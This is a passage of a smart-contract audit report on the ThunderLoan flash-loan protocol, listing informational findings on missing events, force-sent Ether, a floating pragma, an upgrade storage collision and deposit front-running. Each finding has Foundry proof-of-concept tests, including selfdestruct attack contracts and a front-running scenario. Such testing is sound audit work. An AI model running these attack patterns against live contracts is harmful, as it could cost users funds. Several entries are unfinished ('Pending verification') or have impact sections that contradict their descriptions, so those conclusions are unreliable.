            if (entries[i].topics[0] == expectedTopic) {
                eventFound = true;
                break;
            }
        }

        // This assertion proves the vulnerability: no event is emitted.
        // If the vulnerability were fixed, this test would fail.
        assertFalse(eventFound, "A FlashLoanFeeUpdated event was emitted, but was not expected.");
        
        // Verify the state was still changed
        assertEq(thunderLoan.getFee(), newFee);
    }
}
```

## Suggested Mitigation
Define a `FlashLoanFeeUpdated` event and emit it within the `updateFlashLoanFee` function whenever the fee is changed. This ensures that changes to this critical parameter are transparent and easily trackable on-chain.

```solidity
// src/upgradedProtocol/ThunderLoanUpgraded.sol

contract ThunderLoanUpgraded is ... {
    // ...
    event FlashLoanFeeUpdated(uint256 newFee);
    // ...

    function updateFlashLoanFee(uint256 newFee) external onlyOwner {
        if (newFee > FEE_PRECISION) {
            revert ThunderLoan__BadNewFee();
        }
        s_flashLoanFee = newFee;
        emit FlashLoanFeeUpdated(newFee);
    }

    // ...
}
```

## [I-7]. Event Consistency issue in ThunderLoanUpgraded::repay

## Description
The `repay` function allows a flash loan borrower to return funds to the protocol. This function facilitates a transfer of funds into the `AssetToken` contract but does not emit an event. For accounting, monitoring, and transparency, all functions that handle significant fund movements should emit events.

## Impact
The issue affects only off-chain observability: without a dedicated `Repayment` event, indexers and monitoring tools must rely on low-level ERC20 `Transfer` logs, which complicates accounting but does not jeopardize protocol funds or correctness.

## Proof of Concept
1. A user takes a flash loan.
2. The user's receiver contract calls the `repay` function on `ThunderLoanUpgraded` to return the borrowed amount plus the fee.
3. The funds are successfully transferred to the corresponding `AssetToken` contract.
4. No `Repayment` event is emitted, leaving this action unlogged on-chain in a structured manner.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {ThunderLoanUpgraded} from "../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {IFlashLoanReceiver} from "../src/interfaces/IFlashLoanReceiver.sol";

contract RepayingFlashLoaner is IFlashLoanReceiver {
    ThunderLoanUpgraded public thunderLoan;
    MockERC20 public token;

    constructor(address _tl, address _token) {
        thunderLoan = ThunderLoanUpgraded(_tl);
        token = MockERC20(_token);
    }

    function executeOperation(
        address /*tokenAddr*/,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /*params*/
    ) external override returns (bool) {
        token.approve(address(thunderLoan), amount + fee);
        thunderLoan.repay(token, amount + fee);
        return true;
    }
}

contract RepayEventTest is Test {
    ThunderLoanUpgraded internal thunderLoan;
    MockERC20 internal weth;

    function setUp() public {
        ThunderLoanUpgraded logic = new ThunderLoanUpgraded();
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(logic),
            abi.encodeWithSelector(ThunderLoanUpgraded.initialize.selector, address(0))
        );
        thunderLoan = ThunderLoanUpgraded(address(proxy));

        weth = new MockERC20("WETH", "WETH", 18);
        weth.mint(address(this), 1 ether);
        weth.approve(address(thunderLoan), 1 ether);
        thunderLoan.setAllowedToken(weth, true);
        thunderLoan.deposit(weth, 1 ether);
    }

    function test_NoRepaymentEventEmitted() public {
        // prepare a borrower
        RepayingFlashLoaner loaner = new RepayingFlashLoaner(address(thunderLoan), address(weth));
        weth.mint(address(loaner), 1 ether);

        // start recording logs
        vm.recordLogs();
        thunderLoan.flashloan(address(loaner), weth, 0.1 ether, "");
        Vm.Log[] memory entries = vm.getRecordedLogs();

        bytes32 repaymentSig = keccak256("Repayment(address,address,uint256)");
        bool found;
        for (uint256 i; i < entries.length; ++i) {
            if (entries[i].topics[0] == repaymentSig) {
                found = true;
                break;
            }
        }
        assertTrue(!found, "Repayment event should NOT be emitted yet");
    }
}

## Suggested Mitigation
Define and emit an event in the `repay` function to provide a clear on-chain record of flash loan repayments.

```solidity
// In ThunderLoanUpgraded.sol

event Repayment(IERC20 indexed token, address indexed payer, uint256 amount);

function repay(IERC20 token, uint256 amount) public {
    if (!s_currentlyFlashLoaning[token]) {
        revert ThunderLoan__NotCurrentlyFlashLoaning();
    }
    AssetToken assetToken = s_tokenToAssetToken[token];
    token.safeTransferFrom(msg.sender, address(assetToken), amount);
    emit Repayment(token, msg.sender, amount);
}
```

## [I-8]. Unexpected Eth issue in ThunderLoanUpgraded::NA

## Description
The `ThunderLoanUpgraded` contract does not implement a `receive()` or `fallback()` payable function. However, Ether can still be forcibly sent to the contract address, for example, by another contract calling `selfdestruct(payable(address(thunderLoanUpgraded)))`. Since there is no function to withdraw Ether from the contract, any Ether sent to it will be permanently stuck.

## Impact
While this does not pose a direct threat to the protocol's funds, it can result in a permanent loss of funds for users who accidentally or intentionally send Ether to the contract address. It is a best practice to provide a mechanism for fund recovery.

## Proof of Concept
1. An attacker creates a contract, `ForceSend`.
2. The attacker funds `ForceSend` with 1 ETH.
3. The attacker calls a function on `ForceSend` that executes `selfdestruct(payable(address(thunderLoanUpgraded)))`.
4. The 1 ETH is forcibly transferred to the `ThunderLoanUpgraded` contract.
5. The ETH is now locked within the `ThunderLoanUpgraded` contract forever, as no withdrawal function exists.

## Proof of Code
```solidity
// test/UnexpectedEth.t.sol
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test} from "forge-std/Test.sol";
import {ThunderLoanUpgraded} from "../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import {MockPoolFactory} from "./mocks/MockPoolFactory.sol";

contract ForceSend {
    constructor() payable {}

    function kill(address payable recipient) public {
        selfdestruct(recipient);
    }
}

contract UnexpectedEthTest is Test {
    ThunderLoanUpgraded internal thunderLoan;

    function setUp() public {
        MockPoolFactory poolFactory = new MockPoolFactory();
        thunderLoan = new ThunderLoanUpgraded();
        thunderLoan.initialize(address(poolFactory));
    }

    function testEthCanBeStuck() public {
        address payable thunderLoanAddress = payable(address(thunderLoan));
        assertEq(thunderLoanAddress.balance, 0);

        // Force send 1 ETH to the contract
        ForceSend sender = new ForceSend{value: 1 ether}();
        sender.kill(thunderLoanAddress);

        // The ETH is now in the contract balance but cannot be withdrawn.
        assertEq(thunderLoanAddress.balance, 1 ether);
    }
}
```

## Suggested Mitigation
Implement a function that allows the contract owner to withdraw any Ether that has been accidentally sent to the contract. A similar function for rescuing stuck ERC20 tokens is also recommended.
```solidity
// In ThunderLoanUpgraded.sol
function withdrawEther() external onlyOwner {
    uint256 balance = address(this).balance;
    (bool success, ) = owner().call{value: balance}("");
    require(success, "Transfer failed.");
}

function withdrawErc20(address tokenAddress) external onlyOwner {
    IERC20 token = IERC20(tokenAddress);
    uint256 balance = token.balanceOf(address(this));
    token.transfer(owner(), balance);
}
```

## [I-9]. Pragma issue in OracleUpgradeable::NA

## Description
All contracts in the project use a floating pragma version (`pragma solidity ^0.8.20;`). This is not a best practice as it allows the contracts to be compiled with any patch version of the compiler greater than or equal to `0.8.20` and less than `0.9.0`. A future, unreleased compiler version could introduce bugs that might affect the behavior of the contracts, potentially leading to security vulnerabilities. It is recommended to lock the pragma to a specific, audited compiler version.

## Impact
Using a floating pragma might lead to the contract being deployed with a compiler version that has unfound bugs, which could compromise the contract's security or behavior. This introduces a small but unnecessary risk.

## Proof of Concept
1. A new Solidity compiler version, e.g., `0.8.25`, is released with a subtle bug in the optimizer or code generation.
2. The project is compiled and deployed using this new version.
3. The bug in the compiler manifests in the deployed bytecode, creating a vulnerability that was not present when tested with version `0.8.20`.

## Proof of Code
// This is a best-practice violation, not a runtime vulnerability that can be demonstrated with a unit test.

## Suggested Mitigation
Lock the pragma to a specific version that has been well-tested and is considered stable. This ensures that the contract bytecode is always predictable and is not subject to unknown risks from future compiler versions.

```solidity
// Before
pragma solidity ^0.8.20;

// After
pragma solidity 0.8.20;
```

## [I-10]. Event Consistency issue in AssetToken::updateExchangeRate

## Description
The `AssetToken.updateExchangeRate` function modifies `s_exchangeRate`, which is a critical state variable that determines the value of a liquidity provider's holdings. However, this state change does not emit an event. The lack of an `ExchangeRateUpdated` event makes it difficult for off-chain services, monitoring tools, and users to track changes in the value of their investment in real-time. All critical state changes should emit events to ensure transparency and observability.

## Impact
The primary impact is a reduction in transparency and observability. It becomes harder for liquidity providers and third-party integrators to build services that monitor the performance of assets within the ThunderLoan protocol. This does not pose a direct security threat but is a significant deviation from smart contract development best practices.

## Proof of Concept
1. A user provides liquidity and receives `AssetToken`s.
2. Multiple flash loans occur, causing the `updateExchangeRate` function to be called several times, increasing the `s_exchangeRate`.
3. The user has no direct way to track these changes via on-chain events. They would need to call the `getExchangeRate()` view function periodically or deduce the change from other events, which is inefficient and less reliable.

## Proof of Code
// This is an observability issue, not a runtime vulnerability that can be demonstrated with a failing unit test.

## Suggested Mitigation
An event should be added to the `AssetToken` contract and emitted whenever the `s_exchangeRate` is modified. This will provide a clear, on-chain log of all changes to the exchange rate.

```solidity
// In AssetToken.sol

event ExchangeRateUpdated(uint256 newRate);

function updateExchangeRate(uint256 fee) external onlyThunderLoan {
    uint256 currentTotalSupply = totalSupply();
    if (currentTotalSupply == 0) {
        return;
    }
    s_exchangeRate = s_exchangeRate + (fee * EXCHANGE_RATE_PRECISION) / currentTotalSupply;
    emit ExchangeRateUpdated(s_exchangeRate);
}
```

## [I-11]. Unexpected Eth issue in ThunderLoan::NA

## Description
The `ThunderLoan` and `ThunderLoanUpgraded` contracts do not implement a `receive()` or `fallback()` payable function. If Ether is forcibly sent to the contract address (e.g., via `selfdestruct` from another contract or as a coinbase transaction), it will be locked in the contract forever, as there is no function to withdraw it.

## Impact
Ether that is forcibly transferred to the implementation address cannot be retrieved by ordinary users because the current implementation exposes no payable fallback nor withdrawal routine. The ETH is not permanently lost, however: the owner (who already possesses the ability to upgrade the implementation via UUPS) can always deploy a new version that contains a withdraw function and migrate the proxy to it. Therefore only users who accidentally send ETH to the proxy are affected until – and unless – the owner decides to recover it. The protocol’s funds and accounting remain unaffected.

## Proof of Concept
1. An attacker creates a simple contract with a payable constructor and a `destroy(address target)` function.
2. The attacker deploys this contract, sending 1 ETH to it.
3. The attacker calls `destroy(address(thunderLoan))`, triggering `selfdestruct`.
4. The 1 ETH from the attacker's contract is forcibly transferred to the `ThunderLoan` contract address.
5. The 1 ETH is now irrecoverable.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";

contract SuicideContract {
    constructor() payable {}
    function destroy(address payable target) public {
        selfdestruct(target);
    }
}

contract UnexpectedEthTest is Test {
    address thunderLoan = makeAddr("thunderLoan");

    function test_CanLockEthInContract() public {
        uint256 initialBalance = thunderLoan.balance;
        assertEq(initialBalance, 0);

        // Attacker contract with 1 ETH forces ETH into the loan contract
        SuicideContract suicide = new SuicideContract{value: 1 ether}();
        suicide.destroy(payable(thunderLoan));

        uint256 finalBalance = thunderLoan.balance;
        assertEq(finalBalance, 1 ether, "ETH should be locked in the contract");
    }
}
```

## Suggested Mitigation
It is best practice for contracts to include a mechanism to recover ETH that is accidentally sent to them. Add a `receive` function and an owner-only function to withdraw any ETH balance.

```solidity
// Add to ThunderLoan.sol and ThunderLoanUpgraded.sol

receive() external payable {}

function withdrawEther() external onlyOwner {
    (bool success, ) = owner().call{value: address(this).balance}("");
    require(success, "ThunderLoan: ETH withdrawal failed");
}
```

## [I-12]. Storage Layout issue in ThunderLoanUpgraded::NA

## Description
When upgrading from `ThunderLoan` to `ThunderLoanUpgraded`, the storage layout is not compatible. The `ThunderLoanUpgraded` contract removes two state variables (`s_feePrecision` and `s_allowedTokens`) that existed in the original `ThunderLoan` contract. This causes the storage slots of subsequent state variables (`s_flashLoanFee` and `s_currentlyFlashLoaning`) to shift, leading to state corruption. For example, after the upgrade, the `s_flashLoanFee` variable in the new implementation will read from the storage slot that previously held `s_feePrecision`, and the `s_currentlyFlashLoaning` mapping will point to the slot of the `s_allowedTokens` mapping.

## Impact
Pending verification

## Proof of Concept
Pending verification

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoan} from "../src/protocol/ThunderLoan.sol";
import {ThunderLoanUpgraded} from "../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {ProxyAdmin} from "@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol";

contract StorageLayoutTest is Test {
    ProxyAdmin internal proxyAdmin;
    address internal proxyAddress;

    address internal owner = makeAddr("owner");

    function setUp() public {
        vm.startPrank(owner);
        // 1. Deploy V1 behind a proxy
        ThunderLoan implementationV1 = new ThunderLoan();
        proxyAdmin = new ProxyAdmin();
        bytes memory data = abi.encodeWithSelector(ThunderLoan.initialize.selector, address(0));
        TransparentUpgradeableProxy proxy = new TransparentUpgradeableProxy(address(implementationV1), address(proxyAdmin), data);
        proxyAddress = address(proxy);
        vm.stopPrank();
    }

    function test_Upgrade_StorageCollision() public {
        ThunderLoan loanV1 = ThunderLoan(proxyAddress);

        // 2. Check initial state of V1
        uint256 feePrecisionV1 = loanV1.s_feePrecision();
        uint256 flashLoanFeeV1 = loanV1.getFee();

        assertEq(feePrecisionV1, 1e18, "V1 fee precision should be 1e18");
        assertEq(flashLoanFeeV1, 3e15, "V1 flash loan fee should be 3e15");

        // 3. Upgrade to V2
        vm.startPrank(owner);
        ThunderLoanUpgraded implementationV2 = new ThunderLoanUpgraded();
        proxyAdmin.upgrade(TransparentUpgradeableProxy(proxyAddress), address(implementationV2));
        vm.stopPrank();

        ThunderLoanUpgraded loanV2 = ThunderLoanUpgraded(proxyAddress);

        // 4. Read fee from V2. It will read from the wrong storage slot.
        uint256 flashLoanFeeV2 = loanV2.getFee();

        // 5. Assert that V2 fee is now the value of V1's feePrecision, demonstrating the storage collision.
        assertEq(flashLoanFeeV2, feePrecisionV1, "V2 flash loan fee should equal V1 fee precision due to collision");
        assertNotEq(flashLoanFeeV2, flashLoanFeeV1, "V2 flash loan fee is corrupted");

        console.log("Attack successful: Upgraded contract state is corrupted.");
        console.log("V2 Flash Loan Fee: %s", flashLoanFeeV2);
    }
}
```

## Suggested Mitigation
Pending verification

## [I-13]. Frontrun/Backrun/Sandwhich MEV issue in ThunderLoan::deposit(IERC20,uint256)

## Description
The `deposit` function is vulnerable to front-running (or sandwich) attacks. The function calculates the amount of `AssetToken`s to mint based on the current `exchangeRate`. An attacker can see a large pending deposit transaction in the mempool. The attacker can front-run this transaction by executing their own transaction (e.g., a flash loan) that generates a fee. This fee increases the `exchangeRate`. When the victim's deposit is executed, they will receive fewer `AssetToken`s than they expected for their capital, with the difference in value being captured by existing liquidity providers, including the attacker.

## Impact
The scenario describes normal fee accrual where depositors that join *after* interest is accrued do not receive a share of that past interest. No loss of principal occurs and no attacker can extract value beyond the protocol-defined fee distribution. Therefore there is no security impact.

## Proof of Concept
1. A victim prepares to deposit 1,000,000 DAI into the ThunderLoan pool. At this time, the exchange rate is 1 tDAI for 1 DAI.
2. An attacker sees the victim's transaction in the mempool.
3. The attacker front-runs the victim by taking a large flash loan of DAI from the ThunderLoan pool. This action generates a fee.
4. The `updateExchangeRate` function is called, and the tDAI exchange rate increases slightly (e.g., to 1.001).
5. The victim's transaction is now processed. They deposit 1,000,000 DAI but are minted `1,000,000 / 1.001` = `999,000.99` tDAI instead of 1,000,000 tDAI.
6. The value difference (almost 1000 DAI) is now distributed among the LPs that existed before the victim's deposit, which could include the attacker.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoan} from "../src/protocol/ThunderLoan.sol";
import {AssetToken} from "../src/protocol/AssetToken.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {ProxyAdmin} from "@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol";
import {IFlashLoanReceiver} from "../src/interfaces/IFlashLoanReceiver.sol";

contract DummyReceiver is IFlashLoanReceiver {
    function executeOperation(address, uint256, uint256, address, bytes calldata) external pure returns (bool) {
        return true;
    }
}

contract FrontrunTest is Test {
    ThunderLoan internal thunderLoan;
    ProxyAdmin internal proxyAdmin;
    ERC20Mock internal dai;
    AssetToken internal tDai;

    address internal owner = makeAddr("owner");
    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");

    function setUp() public {
        vm.startPrank(owner);
        ThunderLoan implementation = new ThunderLoan();
        proxyAdmin = new ProxyAdmin();
        bytes memory data = abi.encodeWithSelector(ThunderLoan.initialize.selector, address(0));
        TransparentUpgradeableProxy proxy = new TransparentUpgradeableProxy(address(implementation), address(proxyAdmin), data);
        thunderLoan = ThunderLoan(address(proxy));
        vm.stopPrank();

        dai = new ERC20Mock();
        // Initial liquidity and token setup
        vm.startPrank(owner);
        dai.mint(owner, 1_000_000 ether);
        dai.approve(address(thunderLoan), 1_000_000 ether);
        thunderLoan.deposit(dai, 1_000_000 ether);
        vm.stopPrank();
        tDai = thunderLoan.s_tokenToAssetToken(dai);
    }

    function test_Frontrun_Deposit() public {
        uint256 victimDepositAmount = 500_000 ether;
        dai.mint(victim, victimDepositAmount);
        vm.startPrank(victim);
        dai.approve(address(thunderLoan), victimDepositAmount);
        vm.stopPrank();

        uint256 initialRate = tDai.getExchangeRate();
        uint256 expectedTokensForVictim = (victimDepositAmount * 1e18) / initialRate;

        // 1. Attacker front-runs with a flashloan to manipulate the exchange rate
        DummyReceiver receiver = new DummyReceiver();
        dai.mint(attacker, 10_000 ether); // Fee money
        vm.startPrank(attacker);
        dai.approve(address(thunderLoan), 10_000 ether);
        thunderLoan.flashloan(address(receiver), dai, 1_000_000 ether, "");
        vm.stopPrank();

        uint256 manipulatedRate = tDai.getExchangeRate();
        assertTrue(manipulatedRate > initialRate, "Rate should have increased");

        // 2. Victim's deposit transaction executes at the manipulated rate
        vm.startPrank(victim);
        uint256 initialVictimBalance = tDai.balanceOf(victim);
        thunderLoan.deposit(dai, victimDepositAmount);
        uint256 finalVictimBalance = tDai.balanceOf(victim);
        vm.stopPrank();

        uint256 actualTokensMinted = finalVictimBalance - initialVictimBalance;

        // 3. Victim received fewer tokens than expected
        assertTrue(actualTokensMinted < expectedTokensForVictim, "Victim received fewer tokens");
        console.log("Expected tDAI for victim: %s", expectedTokensForVictim);
        console.log("Actual tDAI for victim:   %s", actualTokensMinted);
        console.log("Loss for victim:          %s", expectedTokensForVictim - actualTokensMinted);
    }
}
```

## Suggested Mitigation
Introduce a slippage protection parameter to the `deposit` function. The user should be able to specify the minimum amount of asset tokens they are willing to receive (`minAmountOut`). The function should check if the calculated amount to mint is greater than or equal to this parameter, and revert otherwise.

```diff
// In ThunderLoan.sol and ThunderLoanUpgraded.sol
- function deposit(IERC20 token, uint256 amount) external {
+ function deposit(IERC20 token, uint256 amount, uint256 minAmountOut) external {
    // ...
    uint256 amountToMint = (amount * 1e18) / assetToken.getExchangeRate();
+   if (amountToMint < minAmountOut) {
+       revert ThunderLoan_Slippage();
+   }
    assetToken.mint(msg.sender, amountToMint);
    // ...
}
```



